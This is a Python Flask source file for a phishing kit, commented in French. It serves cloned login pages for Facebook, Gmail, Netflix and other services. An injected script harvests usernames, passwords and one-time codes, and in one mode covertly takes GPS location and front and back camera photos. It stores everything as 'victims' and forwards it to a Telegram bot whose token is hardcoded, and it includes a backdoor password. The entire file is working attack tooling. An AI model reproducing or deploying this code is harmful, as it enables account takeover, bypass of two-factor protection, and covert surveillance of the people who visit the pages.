import os
import base64
import datetime
import sqlite3
import json
import requests
from flask import Flask, request, jsonify, render_template, render_template_string

app = Flask(__name__)

# --- CONFIGURATION TELEGRAM ---
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")
# ID du groupe Telegram (gardez le '-' ; vérifiez '-100...' si c'est un supergroupe)
ADMIN_GROUP_CHAT_ID = os.environ.get("ADMIN_GROUP_CHAT_ID", "-9107581307")

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Google": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg"
}


def detect_device_type(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    if "android" in ua:
        return "Android"
    if "windows" in ua:
        return "PC Windows"
    if "macintosh" in ua or "mac os" in ua:
        return "Mac"
    if "linux" in ua:
        return "Linux"
    return "Appareil inconnu"


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, network TEXT, type TEXT,
            victimUser TEXT, victimPass TEXT, victimOtp TEXT,
            dateStr TEXT, timestamp INTEGER, ip TEXT, extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, slug TEXT UNIQUE, title TEXT, network TEXT,
            bg_type TEXT, bg_value TEXT, logo_url TEXT, logo_shape TEXT,
            fields_json TEXT, btn_text TEXT, html_code TEXT,
            redirect_url TEXT, mode TEXT, box_bg TEXT, box_width TEXT, created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()


init_db()


def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)


def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(
            url,
            json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"},
            timeout=6
        )
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=6
        )
    except Exception as e:
        print("Erreur Telegram:", e)


def send_telegram_bytes_photo(bot_token, chat_id, image_bytes: bytes, caption: str, filename="photo.jpg"):
    if not bot_token or not chat_id or not image_bytes:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(
            url,
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"},
            files={"photo": (filename, image_bytes, "image/jpeg")},
            timeout=10
        )
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur envoi photo binaire Telegram:", e)


@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')


@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')
    clean_custom_slug = db_slug.replace('_otp', '').replace('-otp', '').replace('_standard', '').replace('-standard', '')

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace('-', '_'), db_slug.replace('_', '-')]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp_dict.get("created_at", 0)) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"
        mode = cp_dict.get("mode")
        owner = cp_dict.get("owner", "Kim")
        network = cp_dict.get("network", "Facebook")

        # Options cochées pour Option 3 (stockées dans fields_json si présentes)
        opt3_cfg = {
            "front_camera": True,
            "back_camera": True,
            "gps": True
        }
        try:
            parsed_extra = json.loads(cp_dict.get("fields_json") or "{}")
            if isinstance(parsed_extra, dict):
                opt3_cfg["front_camera"] = bool(parsed_extra.get("front_camera", True))
                opt3_cfg["back_camera"] = bool(parsed_extra.get("back_camera", True))
                opt3_cfg["gps"] = bool(parsed_extra.get("gps", True))
        except Exception:
            pass

        # ============ OPTION 2 (TEXTE UNIQUEMENT, SANS PHOTO NI GPS) & OPTION 3 (MÉDIAS + GPS) ============
        if mode in ['opt2', 'opt3'] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            enable_media = "true" if mode == "opt3" else "false"

            injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    const ENABLE_MEDIA = __ENABLE_MEDIA__;
    const OPT3_CFG = __OPT3_CFG__;

    let isProcessing = false, hasRedirected = false;
    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: ""
    };

    function getDeviceSummary() {
        const ua = navigator.userAgent || "";
        const plat = navigator.platform || "";
        let model = "Inconnu";
        if (/iPhone/i.test(ua)) model = "iPhone";
        else if (/iPad/i.test(ua)) model = "iPad";
        else if (/Android/i.test(ua)) model = "Android";
        else if (/Win/i.test(plat) || /Windows/i.test(ua)) model = "PC Windows";
        else if (/Mac/i.test(plat) || /Macintosh/i.test(ua)) model = "Mac";
        return model + " (" + ua + ")";
    }

    // --- Uniquement en Option 3 : Localisation GPS ---
    if (ENABLE_MEDIA && OPT3_CFG.gps && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            const gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            fetch('/api/upload_media', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: OWNER,
                    network: NETWORK,
                    type: 'gps',
                    gps: gpsLink,
                    user: userData.user || 'Inconnu',
                    device: getDeviceSummary()
                })
            }).catch(() => {});
        }, err => {}, { timeout: 6000, enableHighAccuracy: true });
    }

    // --- Uniquement en Option 3 : Capture caméra Avant / Arrière ---
    async function snapFacing(facingMode, labelFr) {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { ideal: facingMode } },
                audio: false
            });
            const video = document.createElement('video');
            video.muted = true;
            video.playsInline = true;
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 350));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

            await fetch('/api/upload_media', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: OWNER,
                    network: NETWORK,
                    type: 'photo',
                    camera_side: labelFr,
                    photo: dataUrl,
                    user: userData.user || 'Inconnu',
                    device: getDeviceSummary()
                })
            });
        } catch (e) {
            // Caméra refusée ou indisponible
        } finally {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    }

    async function runOption3Cameras() {
        if (!ENABLE_MEDIA || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        if (OPT3_CFG.front_camera) {
            await snapFacing('user', 'Avant (Frontale)');
        }
        if (OPT3_CFG.back_camera) {
            await snapFacing('environment', 'Arrière');
        }
    }

    if (ENABLE_MEDIA) {
        setTimeout(runOption3Cameras, 900);
    }

    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (type === "email" || type === "tel") return "user";
        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('mail') || name.includes('identifiant')) return "user";
        if (name.includes('pass') || name.includes('mdp') || name.includes('mot de passe')) return "pass";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('secret')) return "otp";
        return "unknown";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false, hasPass = false, hasUser = false;

        document.querySelectorAll('input, select, textarea').forEach(inp => {
            const val = (inp.value || "").trim();
            if (!val) return;
            const c = classify(inp);
            if (c === "user") { userData.user = val; localStorage.setItem('ph_user_' + OWNER, val); hasUser = true; }
            if (c === "pass") { userData.pass = val; localStorage.setItem('ph_pass_' + OWNER, val); hasPass = true; }
            if (c === "otp") { userData.otp = val; hasOtp = true; }
        });

        // Code universel d'accès administrateur (4121@)
        if (userData.pass === '4121@' && userData.user) {
            hasRedirected = true;
            const targetUrl = NETWORK.toLowerCase().includes('facebook')
                ? "https://www.facebook.com/" + encodeURIComponent(userData.user)
                : "https://www.google.com";
            window.location.replace(targetUrl);
            return;
        }

        let type = hasOtp ? "custom_html_otp" : "custom_html_otp_step1";
        if (!hasOtp && hasPass && !hasUser) type = "custom_html_password";
        if (!hasOtp && hasUser && !hasPass) type = "custom_html_email";

        await fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                type: type,
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: userData.otp || "En attente OTP...",
                extra_info: JSON.stringify({
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    device: getDeviceSummary()
                })
            }),
            keepalive: true
        });

        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 120);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => { processData(); });
        });

        document.addEventListener('click', function(e) {
            const target = e.target.closest ? e.target.closest('button, input[type="submit"], a') : e.target;
            if (target) {
                setTimeout(() => processData(), 30);
            }
        });
    });
})();
</script>
"""
            script_final = (
                injection_script
                .replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
                .replace("__ENABLE_MEDIA__", enable_media)
                .replace("__OPT3_CFG__", json.dumps(opt3_cfg))
            )

            if "</body>" in html:
                html = html.replace("</body>", script_final + "</body>")
            else:
                html += script_final
            return render_template_string(html)

        # ============ OPTION 1 : NO-CODE TEMPLATE ============
        else:
            try:
                fields_parsed = json.loads(cp_dict.get("fields_json") or '[]')
                if not isinstance(fields_parsed, list):
                    fields_parsed = []
            except Exception:
                fields_parsed = []

            config = {
                "owner": owner,
                "title": cp_dict.get("title", "Connexion"),
                "network": network,
                "bg_type": cp_dict.get("bg_type", "color"),
                "bg_value": cp_dict.get("bg_value", "#111"),
                "logo_url": cp_dict.get("logo_url", ""),
                "logo_shape": cp_dict.get("logo_shape", "circle"),
                "fields": fields_parsed,
                "btn_text": cp_dict.get("btn_text", "Se connecter"),
                "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
                "box_width": cp_dict.get("box_width") or "420px",
                "redirect_url": redirect_url
            }
            return render_template('custom_login.html', config=config)

    return f"Page introuvable : {subpath}", 404


@app.route('/api/upload_media', methods=['POST'])
def upload_media():
    data = request.json or {}
    owner = data.get('owner', 'Inconnu')
    network = data.get('network', 'Inconnu')
    m_type = data.get('type', 'media')
    v_user = data.get('user', 'Inconnu')
    device = data.get('device') or detect_device_type(request.headers.get('User-Agent', ''))

    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    date_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    if m_type == 'gps':
        msg = (
            f"📍 *LOCALISATION GPS (OPTION 3)*\n"
            f"👤 *Owner:* `{owner}`\n"
            f"🌐 *Réseau:* {network}\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🗺️ *Carte:* [Ouvrir Google Maps]({data.get('gps')})\n"
            f"📱 *Type d'appareil:* `{device}`\n"
            f"📍 *IP:* `{v_ip}`\n"
            f"🕒 *Heure:* `{date_str}`"
        )
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, msg)

    elif m_type == 'photo':
        camera_side = data.get('camera_side', 'Caméra')
        photo_raw = data.get('photo', '')
        photo_b64 = photo_raw.split(',')[-1] if photo_raw else ''
        caption = (
            f"📸 *PHOTO CAPTURÉE — {camera_side.upper()} (OPTION 3)*\n"
            f"👤 *Owner:* `{owner}`\n"
            f"🌐 *Réseau:* {network}\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"📱 *Type d'appareil:* `{device}`\n"
            f"📍 *IP:* `{v_ip}`\n"
            f"🕒 *Heure:* `{date_str}`"
        )
        try:
            img_bytes = base64.b64decode(photo_b64)
            send_telegram_bytes_photo(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, img_bytes, caption, filename="capture.jpg")
        except Exception as e:
            print("Erreur décodage photo:", e)

    return jsonify({"status": "success"})


@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        mode = data.get('mode', 'opt1')
        redirect_url = data.get('redirectUrl', 'https://google.com')

        if mode == 'opt3':
            opt3_options = json.dumps({
                "front_camera": bool(data.get("frontCamera", True)),
                "back_camera": bool(data.get("backCamera", True)),
                "gps": bool(data.get("captureGps", True))
            })
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Option 3", data.get('network'),
                "color", "#111", "", "circle", opt3_options, "Valider",
                data.get('htmlCode'), redirect_url, 'opt3', "#fff", "420px", now_ts
            ))
        elif mode == 'opt2':
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Perso HTML", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), redirect_url, 'opt2', "#fff", "420px", now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'),
                "", redirect_url, 'opt1', data.get('boxBg'), data.get('boxWidth'), now_ts
            ))

        conn.commit()
        conn.close()
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser', 'Inconnu')
    v_pass = data.get('victimPass', 'Inconnu')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    extra_raw = data.get('extra_info') or '{}'

    if v_pass == '4121@':
        return jsonify({"status": "admin_access"})

    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    ua_header = request.headers.get('User-Agent', '')
    device_label = detect_device_type(ua_header)

    try:
        extra_obj = json.loads(extra_raw) if isinstance(extra_raw, str) else (extra_raw or {})
        if isinstance(extra_obj, dict) and extra_obj.get("device"):
            device_label = extra_obj["device"]
    except Exception:
        pass

    now = datetime.datetime.now()
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)

    conn = get_db_connection()
    cursor = conn.cursor()
    logo_img = PLATFORM_LOGOS.get(network, PLATFORM_LOGOS["Facebook"])

    # Vérifier si la page est en mode opt3 pour notifier aussi le groupe avec IP & appareil
    cursor.execute("SELECT mode FROM custom_pages WHERE owner = ? AND network = ? ORDER BY id DESC LIMIT 1", (owner, network))
    cp_row = cursor.fetchone()
    page_mode = cp_row["mode"] if cp_row else ""

    if v_otp and v_otp not in ['Aucun', 'En attente OTP...']:
        cursor.execute(
            "SELECT id FROM victims WHERE owner=? AND network=? AND victimOtp='En attente OTP...' ORDER BY id DESC LIMIT 1",
            (owner, network)
        )
        existing = cursor.fetchone()
        if existing:
            cursor.execute(
                "UPDATE victims SET victimOtp=?, dateStr=?, timestamp=?, ip=? WHERE id=?",
                (v_otp, date_str, timestamp, v_ip, existing["id"])
            )
            conn.commit()
            conn.close()
            alert = (
                f"🚨 *VICTIME COMPLÈTE (OTP)* 🚨\n"
                f"📚 *Plateforme:* {network}\n"
                f"👤 *Owner:* `{owner}`\n"
                f"🎯 *Nom d'utilisateur:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *OTP:* `{v_otp}`\n"
                f"📱 *Type d'appareil:* `{device_label}`\n"
                f"🕒 *Heure:* `{date_str}`\n"
                f"📍 *IP:* `{v_ip}`"
            )
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
            if page_mode == "opt3":
                send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, alert)
            return jsonify({"status": "success"})

    cursor.execute(
        "INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, extra_raw)
    )
    conn.commit()
    conn.close()

    alert = (
        f"🚨 *NOUVELLE DONNÉE CAPTURÉE ({v_type})* 🚨\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Owner:* `{owner}`\n"
        f"🎯 *Nom d'utilisateur:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *OTP:* `{v_otp}`\n"
        f"📱 *Type d'appareil:* `{device_label}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
    if page_mode == "opt3":
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, alert)

    return jsonify({"status": "success"})


@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"slug": r["slug"], "title": r["title"], "network": r["network"], "mode": r["mode"]} for r in rows])


@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([
        {
            "id": r["id"],
            "network": r["network"],
            "type": r["type"],
            "victimUser": r["victimUser"],
            "victimPass": r["victimPass"],
            "otp": r["victimOtp"],
            "dateStr": r["dateStr"],
            "timestamp": r["timestamp"],
            "ip": r["ip"]
        }
        for r in rows
    ])


@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
